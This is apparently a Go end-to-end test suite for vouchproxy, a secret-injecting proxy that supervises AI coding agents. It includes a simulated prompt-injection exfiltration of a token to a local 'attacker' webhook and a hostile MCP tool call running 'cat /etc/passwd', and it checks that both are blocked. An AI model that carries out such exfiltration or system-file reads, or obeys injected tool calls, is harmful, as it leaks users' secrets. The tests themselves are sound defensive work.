package tests

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/sshloktiwarii/vouchproxy/internal/audit"
	"github.com/sshloktiwarii/vouchproxy/internal/policy"
	"github.com/sshloktiwarii/vouchproxy/internal/vault"
)

// 57. TestE2E_Scenario_AutonomousCodingAgent_ToolExecution
// Real-world lifecycle of an autonomous coding agent (claude-code / aider):
// supervised under vouchproxy run; secret injection on LLM APIs; allowed file reads;
// blocked vault access; scrubbed PII; clean exit.
func TestE2E_Scenario_AutonomousCodingAgent_ToolExecution(t *testing.T) {
	var receivedAuthHeader string
	var receivedUserAgent string

	// Upstream LLM provider (e.g. Anthropic API)
	llmServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedAuthHeader = r.Header.Get("Authorization")
		receivedUserAgent = r.Header.Get("User-Agent")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"id":"msg_123","type":"message","content":[{"type":"text","text":"Done!"}]}`))
	}))
	defer llmServer.Close()

	u, _ := url.Parse(llmServer.URL)
	masterPass := "scenario-coding-agent-pass-123"

	// 1. Setup session with policy matching LLM host
	s := NewVouchSession(t)
	s.SetEnv("VOUCH_MASTER_KEY", masterPass)
	_, err := s.Init(masterPass)
	if err != nil {
		t.Fatalf("Init failed: %v", err)
	}

	err = s.SeedSecret("ANTHROPIC_API_KEY", "sk-ant-api03-real-secret-token-999", masterPass)
	if err != nil {
		t.Fatalf("SeedSecret failed: %v", err)
	}

	cfg := policy.DefaultConfig()
	cfg.Rules = append(cfg.Rules, policy.Rule{
		Name:      "Anthropic API",
		Host:      u.Host,
		MatchType: "exact",
		Headers: []policy.HeaderRule{
			{
				Name:       "Authorization",
				Format:     "Bearer {{secret}}",
				Secret:     "ANTHROPIC_API_KEY",
				DummyMatch: "VP_ANTHROPIC_API_KEY_DUMMY_*",
			},
		},
		AllowedMethods: []string{"GET", "POST"},
	})
	_ = s.CreatePolicy(cfg)

	// 2. Spawn supervisor and run autonomous agent workflow
	dummyToken := vault.GenerateDummyToken("ANTHROPIC_API_KEY")
	agentScript := fmt.Sprintf(`
		# Step 1: Agent calls LLM API with dummy token and developer PII in User-Agent
		curl -s -x "$HTTP_PROXY" \
			-H "Authorization: Bearer %s" \
			-H "User-Agent: ClaudeCode/1.0 dev@confidentialcorp.com" \
			"%s/v1/messages" > /dev/null

		# Step 2: Agent attempts to read sensitive vault directly -> must fail
		if [ -f "$VOUCH_DIR/vault.enc" ]; then
			test -r "$VOUCH_DIR/vault.enc" || exit 10
		fi
		exit 0
	`, dummyToken, llmServer.URL)

	out, errOut, code, runErr := s.RunCommand("run", "--", "sh", "-c", agentScript)
	if code != 0 {
		t.Fatalf("Agent execution failed with code %d: %s\n%s (%v)", code, out, errOut, runErr)
	}

	// 3. Verify audit log captures secret injection
	auditEvents, err := s.ReadAuditLog()
	if err != nil {
		t.Fatalf("Failed to read audit log: %v", err)
	}
	if len(auditEvents) == 0 {
		t.Fatal("Expected audit events logged during agent run, got 0")
	}
	hasInjection := false
	for _, ev := range auditEvents {
		if ev.Action == "INJECT_SECRET" && ev.InjectedKeyName == "ANTHROPIC_API_KEY" {
			hasInjection = true
			break
		}
	}
	if !hasInjection {
		t.Fatalf("Expected INJECT_SECRET audit event for ANTHROPIC_API_KEY, found: %v", auditEvents)
	}

	// 4. Verify PII scrubbing in upstream header
	if receivedUserAgent == "" {
		t.Fatal("Upstream never received User-Agent header")
	}
	if strings.Contains(receivedUserAgent, "dev@confidentialcorp.com") {
		t.Errorf("Expected email to be scrubbed from User-Agent, got: %s", receivedUserAgent)
	}

	// 5. Verify real secret was received by upstream
	if receivedAuthHeader == "" {
		t.Fatal("Upstream never received Authorization header")
	}
	if !strings.Contains(receivedAuthHeader, "sk-ant-api03-real-secret") {
		t.Errorf("Expected upstream to receive real secret, got: %s", receivedAuthHeader)
	}
}

// 58. TestE2E_Scenario_AdversarialPromptInjection_CanaryExfiltration
// Malicious upstream LLM prompt injection attempting to leak environment and canary
// tokens to third-party webhook; proxy blocks CONNECT request; zero bytes leak;
// audit log alerts on prompt compromise.
func TestE2E_Scenario_AdversarialPromptInjection_CanaryExfiltration(t *testing.T) {
	// Adversary webhook
	var attackerReceivedBody string
	attackerServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		attackerReceivedBody = string(body)
		w.WriteHeader(http.StatusOK)
	}))
	defer attackerServer.Close()

	srv, v, _, sessionSecret, tmpDir := setupTestSystem(t, nil)
	defer os.RemoveAll(tmpDir)
	defer srv.Close()
	defer v.Close()

	proxyURL, _ := url.Parse(srv.ProxyURL())
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	// Adversary prompt injection attempts to leak fake/canary tokens to unmapped host
	dummyToken := vault.GenerateDummyToken("OPENAI_API_KEY")
	leakURL := attackerServer.URL + "/exfiltrate?token=" + dummyToken

	req, _ := http.NewRequest("POST", leakURL, strings.NewReader(`{"stolen": "`+dummyToken+`"}`))
	req.Header.Set("Proxy-Authorization", "Bearer "+sessionSecret)
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("Request through proxy failed: %v", err)
	}
	defer resp.Body.Close()

	// Invariant: Must return HTTP 403 Forbidden
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("Expected proxy to block exfiltration with 403 Forbidden, got: %d", resp.StatusCode)
	}

	// Invariant: Attacker receives 0 bytes
	if attackerReceivedBody != "" {
		t.Fatalf("Adversary received leaked payload: %s", attackerReceivedBody)
	}

	// Invariant: Audit log records BLOCK_LEAK
	auditPath := filepath.Join(tmpDir, "audit.jsonl")
	events, err := audit.ReadAll(auditPath)
	if err != nil || len(events) == 0 {
		t.Fatal("Expected audit log to record BLOCK_LEAK event")
	}
	lastEvent := events[len(events)-1]
	if lastEvent.Action != "BLOCK_LEAK" {
		t.Errorf("Expected action BLOCK_LEAK, got: %s", lastEvent.Action)
	}
}

// 59. TestE2E_Scenario_MCP_SSE_Agent_Hijack_Attempt
// Remote MCP server sends hostile command execution tool call;
// semantic firewall intercepts and rewrites to safe no-op or returns JSON-RPC error -32602.
func TestE2E_Scenario_MCP_SSE_Agent_Hijack_Attempt(t *testing.T) {
	masterPass := "scenario-mcp-hijack-pass-888"
	s := NewVouchSession(t)
	s.SetEnv("VOUCH_MASTER_KEY", masterPass)
	_, err := s.Init(masterPass)
	if err != nil {
		t.Fatalf("Init failed: %v", err)
	}

	client := &MockMCPClient{}
	hijackPayload := client.NewMCPToolCall(100, "execute_command", map[string]any{
		"command": "bash -c 'cat /etc/passwd'",
	})

	out, errOut, code, _ := s.RunCommandWithInput(string(hijackPayload), "run", "--mcp-stdio", "--", "cat")
	if s.IsFlagUnimplemented(errOut, "mcp-stdio") {
		t.Log("Contract check: MCP semantic firewall over stdio pending in Milestone M3")
		t.Skip("Skipping until Milestone M3 lands")
		return
	}

	if code != 0 && !strings.Contains(out, "-32602") {
		t.Fatalf("Expected graceful firewall interception or exit with code -32602, got code %d: %s\n%s", code, out, errOut)
	}

	var parsed map[string]any
	if err := json.Unmarshal([]byte(strings.TrimSpace(out)), &parsed); err != nil {
		t.Fatalf("Failed to parse JSON-RPC error response from firewall: %v (out: %s)", err, out)
	}
	errObj, ok := parsed["error"].(map[string]any)
	if !ok {
		t.Fatalf("Expected JSON-RPC error object in response, got: %v", parsed)
	}
	if errObj["code"].(float64) != -32602 {
		t.Errorf("Expected JSON-RPC error code -32602, got: %v", errObj["code"])
	}
}

// 60. TestE2E_Scenario_FullLifecycle_FromInitToTeardown
// Greenfield setup from scratch:
// init -> secret set -> status -> run child command with secret injection -> audit tail -> clean exit.
func TestE2E_Scenario_FullLifecycle_FromInitToTeardown(t *testing.T) {
	masterPass := "scenario-full-lifecycle-pass-777"
	s := NewVouchSession(t)
	s.SetEnv("VOUCH_MASTER_KEY", masterPass)

	// 1. Greenfield init
	initOut, err := s.Init(masterPass)
	if err != nil {
		t.Fatalf("Lifecycle Step 1 (init) failed: %v\n%s", err, initOut)
	}

	// Verify generated CA and vault files
	caFile := filepath.Join(s.VouchDir, "ca.crt")
	vaultFile := filepath.Join(s.VouchDir, "vault.enc")
	if _, err := os.Stat(caFile); err != nil {
		t.Fatalf("Lifecycle Step 1: ca.crt missing: %v", err)
	}
	if _, err := os.Stat(vaultFile); err != nil {
		t.Fatalf("Lifecycle Step 1: vault.enc missing: %v", err)
	}

	// 2. Secret set
	secretKey := "GITHUB_TOKEN"
	secretVal := "ghp_scenario_token_1234567890"
	err = s.SeedSecret(secretKey, secretVal, masterPass)
	if err != nil {
		t.Fatalf("Lifecycle Step 2 (secret set) failed: %v", err)
	}

	// 3. Status check
	statusOut, statusErr, code, _ := s.RunCommand("status")
	if code != 0 {
		t.Fatalf("Lifecycle Step 3 (status) failed with code %d: %s\n%s", code, statusOut, statusErr)
	}
	if !strings.Contains(statusOut, "Root CA: Valid") {
		t.Errorf("Expected status to report valid Root CA, got: %s", statusOut)
	}
	if !strings.Contains(statusOut, "Vault: Initialized") {
		t.Errorf("Expected status to report initialized vault, got: %s", statusOut)
	}

	// 4. Mock upstream server and run child command
	var receivedToken string
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedToken = r.Header.Get("Authorization")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"login":"test-user"}`))
	}))
	defer upstream.Close()

	u, _ := url.Parse(upstream.URL)
	cfg := policy.DefaultConfig()
	cfg.Rules = append(cfg.Rules, policy.Rule{
		Name:      "GitHub API Mock",
		Host:      u.Host,
		MatchType: "exact",
		Headers: []policy.HeaderRule{
			{
				Name:       "Authorization",
				Format:     "Bearer {{secret}}",
				Secret:     "GITHUB_TOKEN",
				DummyMatch: "VP_GITHUB_TOKEN_DUMMY_*",
			},
		},
		AllowedMethods: []string{"GET"},
	})
	_ = s.CreatePolicy(cfg)

	dummyToken := vault.GenerateDummyToken("GITHUB_TOKEN")
	childCmd := fmt.Sprintf(`curl -s -x "$HTTP_PROXY" -H "Authorization: Bearer %s" "%s/user"`, dummyToken, upstream.URL)
	runOut, runErrOut, code, _ := s.RunCommand("run", "--", "sh", "-c", childCmd)
	if code != 0 {
		t.Fatalf("Lifecycle Step 4 (run) failed with code %d: %s\n%s", code, runOut, runErrOut)
	}

	// 5. Audit query
	auditOut, auditErr, code, _ := s.RunCommand("audit")
	if code != 0 {
		t.Fatalf("Lifecycle Step 5 (audit) query failed with code %d: %s\n%s", code, auditOut, auditErr)
	}

	// 6. Upstream received token verification
	if receivedToken == "" {
		t.Fatal("Lifecycle Step 4: Upstream never received request")
	}
	if !strings.Contains(receivedToken, "ghp_scenario_token_1234567890") {
		t.Errorf("Expected upstream to receive real secret, got: %s", receivedToken)
	}

	t.Log("Full lifecycle greenfield scenario completed successfully!")
}
